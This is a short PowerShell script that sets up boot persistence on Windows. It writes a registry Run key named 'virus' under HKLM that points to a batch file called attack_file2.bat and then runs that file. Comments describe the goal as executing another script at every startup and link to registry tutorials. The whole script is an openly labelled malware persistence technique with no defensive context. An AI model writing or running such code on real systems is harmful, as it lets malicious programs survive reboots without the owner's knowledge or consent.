$tar = "C:\Users\attack_file2.bat"
Set-Itemproperty -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'virus' -value "$tar"
powershell.exe $tar
# modify the registry so that another Powershell script will be executed every time the computer is started.
# https://blog.netwrix.com/2018/09/11/how-to-get-edit-create-and-delete-registry-keys-with-powershell/
# https://www.itread01.com/content/1547467986.html
# https://ithelp.ithome.com.tw/articles/10028377